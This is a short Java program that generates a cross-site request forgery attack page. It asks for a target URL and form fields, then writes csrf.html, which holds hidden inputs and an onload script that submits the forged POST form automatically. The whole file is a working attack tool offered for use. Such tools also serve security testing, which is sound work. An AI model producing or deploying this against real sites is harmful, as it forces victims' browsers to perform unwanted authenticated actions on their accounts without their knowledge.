import java.io.*;

class CSRF {
	public static void main (String args[]) throws Exception {

		String cont = "y";
		String ip[] = new String[20];
		String ip_val[] = new String[20];
	
		System.out.print("action = ");
		BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
		String action = br.readLine();
		String code = "<script> \nfunction csrf () { \ndocument.f.subbumit.click();  \n}\n</script>\n\n<body onload=\"csrf();\">\n<form action=\"" + action + "\" method=\"post\" name=\"f\">";
		int i = 0;
		while (!cont.equals("n")) {
			System.out.print("input name = ");
			ip[i] = br.readLine();

			System.out.print("input value (" + ip[i] + ") = ");
			ip_val[i] = br.readLine();

			code = code + "\n" + "\t<input type=\"hidden\" name=\""+ ip[i] +"\" value = \""+ ip_val[i] +"\" />";
			i++;

			System.out.print("Continue ? (y or n) = ");
			cont = br.readLine();
		}
		code = code + "\n" + "<input type=\"submit\" name=\"subbumit\" value=\"s\">\n</form>\n</body>";
		System.out.println("\n");
		//System.out.println(code+"\n\n");
		System.out.println("csrf.html file has been created in current folder.\n");
		PrintWriter writer = new PrintWriter("csrf.html", "UTF-8");
		writer.println(code);
		writer.close();
	}
}
